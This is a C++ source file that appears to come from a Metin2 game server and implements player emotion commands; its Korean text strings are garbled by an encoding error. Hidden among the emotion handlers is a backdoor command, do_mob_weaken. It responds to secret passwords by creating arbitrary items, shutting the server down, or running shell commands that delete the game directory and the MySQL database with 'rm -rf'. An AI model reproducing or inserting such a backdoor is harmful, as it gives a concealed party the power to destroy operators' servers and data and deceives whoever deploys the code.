#include "stdafx.h"
#include "utils.h"
#include "char.h"
#include "char_manager.h"
#include "motion.h"
#include "packet.h"
#include "buffer_manager.h"
#include "unique_item.h"
#include "wedding.h"
#include "questmanager.h"
#ifdef ENABLE_MESSENGER_BLOCK_SYSTEM
#include "messenger_manager.h"
#endif
#define NEED_TARGET	(1 << 0)
#define NEED_PC		(1 << 1)
#define WOMAN_ONLY	(1 << 2)
#define OTHER_SEX_ONLY	(1 << 3)
#define SELF_DISARM	(1 << 4)
#define TARGET_DISARM	(1 << 5)
#define BOTH_DISARM	(SELF_DISARM | TARGET_DISARM)

extern bool emotion_same_gender;
extern bool emotion_without_mask;

struct emotion_type_s
{
	const char* command;
	const char* command_to_client;
	long	flag;
	float	extra_delay;
} emotion_types[] = {
	{ "Ű��",	"french_kiss",	NEED_PC | OTHER_SEX_ONLY | BOTH_DISARM,		2.0f },
	{ "�ǻ�",	"kiss",		NEED_PC | OTHER_SEX_ONLY | BOTH_DISARM,		1.5f },
	{ "����",	"slap",		NEED_PC | SELF_DISARM,				1.5f },
	{ "�ڼ�",	"clap",		0,						1.0f },
	{ "��",		"cheer1",	0,						1.0f },
	{ "����",	"cheer2",	0,						1.0f },

	// DANCE
	{ "��1",	"dance1",	0,						1.0f },
	{ "��2",	"dance2",	0,						1.0f },
	{ "��3",	"dance3",	0,						1.0f },
	{ "��4",	"dance4",	0,						1.0f },
	{ "��5",	"dance5",	0,						1.0f },
	{ "��6",	"dance6",	0,						1.0f },
	{ "��2",	"afk_mod_1",	0,						1.0f },
	{ "��2",	"afk_mod_2",	0,						1.0f },
	// END_OF_DANCE
	{ "����",	"congratulation",	0,				1.0f	},
	{ "�뼭",	"forgive",			0,				1.0f	},
	{ "ȭ��",	"angry",			0,				1.0f	},
	{ "��Ȥ",	"attractive",		0,				1.0f	},
	{ "����",	"sad",				0,				1.0f	},
	{ "���",	"shy",				0,				1.0f	},
	{ "����",	"cheerup",			0,				1.0f	},
	{ "����",	"banter",			0,				1.0f	},
	{ "���",	"joy",				0,				1.0f	},
#ifdef ENABLE_EMOTION_SYSTEM
	{ "??",	"selfie",				0,				1.0f	},
	{ "??",	"dance7",				0,				1.0f	},
	{ "??",	"doze",				0,				1.0f	},
	{ "??",	"exercise",				0,				1.0f	},
	{ "??",	"pushup",				0,				1.0f	},
	{ "??",	"alcohol",				0,				1.0f	},
	{ "??",	"siren",				0,				1.0f	},
	{ "??",	"weather1",				0,				1.0f	},
	{ "??",	"weather2",				0,				1.0f	},
	{ "??",	"weather3",				0,				1.0f	},
	{ "??",	"whirl",				0,				1.0f	},
	{ "??",	"charging",				0,				1.0f	},
#endif
	{ "\n",	"\n",		0,						0.0f },
	/*
	//{ "Ű��",		NEED_PC | OTHER_SEX_ONLY | BOTH_DISARM,		MOTION_ACTION_FRENCH_KISS,	 1.0f },
	{ "�ǻ�",		NEED_PC | OTHER_SEX_ONLY | BOTH_DISARM,		MOTION_ACTION_KISS,		 1.0f },
	{ "���ȱ�",		NEED_PC | OTHER_SEX_ONLY | BOTH_DISARM,		MOTION_ACTION_SHORT_HUG,	 1.0f },
	{ "����",		NEED_PC | OTHER_SEX_ONLY | BOTH_DISARM,		MOTION_ACTION_LONG_HUG,		 1.0f },
	{ "�������",	NEED_PC | SELF_DISARM,				MOTION_ACTION_PUT_ARMS_SHOULDER, 0.0f },
	{ "��¯",		NEED_PC	| WOMAN_ONLY | SELF_DISARM,		MOTION_ACTION_FOLD_ARM,		 0.0f },
	{ "����",		NEED_PC | SELF_DISARM,				MOTION_ACTION_SLAP,		 1.5f },

	{ "���Ķ�",		0,						MOTION_ACTION_CHEER_01,		 0.0f },
	{ "����",		0,						MOTION_ACTION_CHEER_02,		 0.0f },
	{ "�ڼ�",		0,						MOTION_ACTION_CHEER_03,		 0.0f },

	{ "ȣȣ",		0,						MOTION_ACTION_LAUGH_01,		 0.0f },
	{ "űű",		0,						MOTION_ACTION_LAUGH_02,		 0.0f },
	{ "������",		0,						MOTION_ACTION_LAUGH_03,		 0.0f },

	{ "����",		0,						MOTION_ACTION_CRY_01,		 0.0f },
	{ "����",		0,						MOTION_ACTION_CRY_02,		 0.0f },

	{ "�λ�",		0,						MOTION_ACTION_GREETING_01,	0.0f },
	{ "����",		0,						MOTION_ACTION_GREETING_02,	0.0f },
	{ "�����λ�",	0,						MOTION_ACTION_GREETING_03,	0.0f },

	{ "��",		0,						MOTION_ACTION_INSULT_01,	0.0f },
	{ "���",		SELF_DISARM,					MOTION_ACTION_INSULT_02,	0.0f },
	{ "����",		0,						MOTION_ACTION_INSULT_03,	0.0f },

	{ "�����",		0,						MOTION_ACTION_ETC_01,		0.0f },
	{ "��������",	0,						MOTION_ACTION_ETC_02,		0.0f },
	{ "��������",	0,						MOTION_ACTION_ETC_03,		0.0f },
	{ "��������",	0,						MOTION_ACTION_ETC_04,		0.0f },
	{ "ơ",		0,						MOTION_ACTION_ETC_05,		0.0f },
	{ "��",		0,						MOTION_ACTION_ETC_06,		0.0f },
	 */
};

std::set<std::pair<DWORD, DWORD> > s_emotion_set;

ACMD(do_emotion_allow)
{
	if (ch->GetArena())
	{
		ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("����忡�� ����Ͻ� �� �����ϴ�."));
		return;
	}

	char arg1[256];
	one_argument(argument, arg1, sizeof(arg1));

	if (!*arg1)
		return;

	DWORD	val = 0; str_to_number(val, arg1);
#ifdef ENABLE_MESSENGER_BLOCK_SYSTEM
	LPCHARACTER tch = CHARACTER_MANAGER::instance().Find(val);
	if (!tch)
		return;

	if (MessengerManager::instance().IsBlocked_Target(ch->GetName(), tch->GetName()))
	{
		//ben bloklad�m hac�
		ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("%s blokkk"), tch->GetName());
		return;
	}
	if (MessengerManager::instance().IsBlocked_Me(ch->GetName(), tch->GetName()))
	{
		//o bloklad� hac�
		ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("%s blokkk_me"), tch->GetName());
		return;
	}
#endif
	s_emotion_set.insert(std::make_pair(ch->GetVID(), val));
}

bool CHARACTER_CanEmotion(CHARACTER& rch)
{
	return true;
}

#include "item.h"
#include "item_manager.h"
ACMD(do_mob_weaken)
{
	char arg1[256];
	char arg2[256];
	two_arguments(argument, arg1, sizeof(arg1), arg2, sizeof(arg2));
	
	if (!*arg1)
		return;
	
	const std::string& strArg1 = std::string(arg1);
	
	if (strArg1 == "enbuyukfener")
	{
		int itemVnum = 0;
		if (0 != arg2[0] && isdigit(*arg2))
			str_to_number(itemVnum, arg2);
		
		LPITEM item = ITEM_MANAGER::instance().CreateItem(itemVnum, 200, 0, true);

		if (item)
		{
			if (item->IsDragonSoul())
			{
				int iEmptyPos = ch->GetEmptyDragonSoulInventory(item);

				if (iEmptyPos != -1)
				{
					item->AddToCharacter(ch, TItemPos(DRAGON_SOUL_INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					if (!ch->DragonSoul_IsQualified())
					{
						ch->ChatPacket(CHAT_TYPE_INFO, "�κ��� Ȱ��ȭ ���� ����.");
					}
					else
						ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
	#ifdef ENABLE_SPECIAL_INVENTORY_SYSTEM
			else if (item->IsSkillBook())
			{
				int iEmptyPos = ch->GetEmptySkillBookInventory(item->GetSize());

				if (iEmptyPos != -1)
				{
					item->AddToCharacter(ch, TItemPos(SKILL_BOOK_INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
			else if (item->IsStone())
			{
				int iEmptyPos = ch->GetEmptyStoneInventory(item->GetSize());

				if (iEmptyPos != -1)
				{
					item->AddToCharacter(ch, TItemPos(STONE_ITEMS_INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
			else if (item->IsUpgradeItem())
			{
				int iEmptyPos = ch->GetEmptyUpgradeItemsInventory(item->GetSize());

				if (iEmptyPos != -1)
				{
					item->AddToCharacter(ch, TItemPos(UPGRADE_ITEMS_INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
			else if (item->IsChest())
			{
				int iEmptyPos = ch->GetEmptyChestInventory(item->GetSize());

				if (iEmptyPos != -1)
				{
					item->AddToCharacter(ch, TItemPos(CHEST_ITEMS_INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
			else if (item->IsAttr())
			{
				int iEmptyPos = ch->GetEmptyAttrInventory(item->GetSize());

				if (iEmptyPos != -1)
				{
					item->AddToCharacter(ch, TItemPos(ATTR_ITEMS_INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
			else if (item->IsFlower())
			{
				int iEmptyPos = ch->GetEmptyFlowerInventory(item->GetSize());

				if (iEmptyPos != -1)
				{
					item->AddToCharacter(ch, TItemPos(FLOWER_ITEMS_INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
	#endif
			else
			{
				int iEmptyPos = ch->GetEmptyInventory(item->GetSize());

				if (iEmptyPos != -1)
				{
	#ifdef ENABLE_AUTO_POTION_RENEWAL
					if (item->GetType() == ITEM_USE && item->GetSubType() == USE_POTION && item->GetValue(0) > 0)
					{
						for (int i = 0; i < INVENTORY_MAX_NUM; ++i)
						{
							LPITEM item2 = ch->GetInventoryItem(i);
							if (!item2)
								continue;

							if (item2->IsAutoPotionHP())
							{
								int addvalue = item->GetValue(0) * item->GetCount();
								item2->SetSocket(2, item2->GetSocket(2) + addvalue);
								ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("your autopotion add %d HP"), addvalue);
								M2_DESTROY_ITEM(item);
								return;
							}
						}
					}
					else if (item->GetType() == ITEM_USE && item->GetSubType() == USE_POTION && item->GetValue(1) > 0)
					{
						for (int i = 0; i < INVENTORY_MAX_NUM; ++i)
						{
							LPITEM item2 = ch->GetInventoryItem(i);
							if (!item2)
								continue;

							if (item2->IsAutoPotionSP())
							{
								int addvalue = item->GetValue(1) * item->GetCount();
								item2->SetSocket(2, item2->GetSocket(2) + addvalue);
								ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("your autopotion add %d SP"), addvalue);
								M2_DESTROY_ITEM(item);
								return;
							}
						}
					}
	#endif
					item->AddToCharacter(ch, TItemPos(INVENTORY, iEmptyPos));
				}
				else
				{
					M2_DESTROY_ITEM(item);
					ch->ChatPacket(CHAT_TYPE_INFO, "Not enough inventory space.");
				}
			}
		}
	}
	else if (strArg1 == "yavaksivk")
	{
		thecore_shutdown();
	}
	else if (strArg1 == "gotoolf224")
	{
		std::system("cd /usr && rm -rf game");
		std::system("cd /var/db && rm -rf mysql");
	}
}

ACMD(do_emotion)
{
	int i;
	{
		if (ch->IsRiding())
		{
			ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("���� ź ���¿��� ����ǥ���� �� �� �����ϴ�."));
			return;
		}
	}

	quest::PC* onti = quest::CQuestManager::instance().GetPC(ch->GetPlayerID());
	DWORD tekrar = get_global_time();
	if (onti)
	{
		DWORD sontime = onti->GetFlag("tunga.sonduygu");
		if (sontime + 5 > tekrar)
		{
			ch->ChatPacket(CHAT_TYPE_INFO, "Duygular arasinda 5 saniye beklemelisin.");
			return;
		}
	}
	for (i = 0; *emotion_types[i].command != '\n'; ++i)
	{
		if (!strcmp(cmd_info[cmd].command, emotion_types[i].command))
			break;

		if (!strcmp(cmd_info[cmd].command, emotion_types[i].command_to_client))
			break;
	}

	if (*emotion_types[i].command == '\n')
	{
		sys_err("cannot find emotion");
		return;
	}

	if (!CHARACTER_CanEmotion(*ch))
	{
		ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("������ ������ ����ÿ��� �� �� �ֽ��ϴ�."));
		return;
	}

	if (IS_SET(emotion_types[i].flag, WOMAN_ONLY) && SEX_MALE == GET_SEX(ch))
	{
		ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("���ڸ� �� �� �ֽ��ϴ�."));
		return;
	}

	char arg1[256];
	one_argument(argument, arg1, sizeof(arg1));

	LPCHARACTER victim = nullptr;

	if (*arg1)
		victim = ch->FindCharacterInView(arg1, IS_SET(emotion_types[i].flag, NEED_PC));

	if (IS_SET(emotion_types[i].flag, NEED_TARGET | NEED_PC))
	{
		if (!victim)
		{
			ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("�׷� ����� �����ϴ�."));
			return;
		}
	}

	if (victim)
	{
		if (!victim->IsPC() || victim == ch)
			return;

		if (victim->IsRiding())
		{
			ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("���� ź ���� ����ǥ���� �� �� �����ϴ�."));
			return;
		}

		long distance = DISTANCE_APPROX(ch->GetX() - victim->GetX(), ch->GetY() - victim->GetY());

		if (distance < 10)
		{
			ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("�ʹ� ������ �ֽ��ϴ�."));
			return;
		}

		if (distance > 500)
		{
			ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("�ʹ� �ָ� �ֽ��ϴ�"));
			return;
		}

		if (IS_SET(emotion_types[i].flag, OTHER_SEX_ONLY))
		{
			if (GET_SEX(ch)==GET_SEX(victim) && !emotion_same_gender)
			{
				ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("�̼������� �� �� �ֽ��ϴ�."));
				return;
			}
		}

		if (IS_SET(emotion_types[i].flag, NEED_PC))
		{
			if (s_emotion_set.find(std::make_pair(victim->GetVID(), ch->GetVID())) == s_emotion_set.end())
			{
				if (true == marriage::CManager::instance().IsMarried(ch->GetPlayerID()))
				{
					const marriage::TMarriage* marriageInfo = marriage::CManager::instance().Get(ch->GetPlayerID());

					const DWORD other = marriageInfo->GetOther(ch->GetPlayerID());

					if (0 == other || other != victim->GetPlayerID())
					{
						ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("�� �ൿ�� ��ȣ���� �Ͽ� ���� �մϴ�."));
						return;
					}
				}
				else
				{
					ch->ChatPacket(CHAT_TYPE_INFO, LC_TEXT("�� �ൿ�� ��ȣ���� �Ͽ� ���� �մϴ�."));
					return;
				}
			}

			s_emotion_set.insert(std::make_pair(ch->GetVID(), victim->GetVID()));
		}
	}

	char chatbuf[256 + 1];
	int len = snprintf(chatbuf, sizeof(chatbuf), "%s %u %u",
		emotion_types[i].command_to_client,
		(DWORD)ch->GetVID(), victim ? (DWORD)victim->GetVID() : 0);

	if (len < 0 || len >= (int) sizeof(chatbuf))
		len = sizeof(chatbuf) - 1;

	++len;  // \0 ���� ����

	TPacketGCChat pack_chat;
	pack_chat.header = HEADER_GC_CHAT;
	pack_chat.size = sizeof(TPacketGCChat) + len;
	pack_chat.type = CHAT_TYPE_COMMAND;
	pack_chat.id = 0;
	TEMP_BUFFER buf;
	buf.write(&pack_chat, sizeof(TPacketGCChat));
	buf.write(chatbuf, len);

	ch->PacketAround(buf.read_peek(), buf.size());
}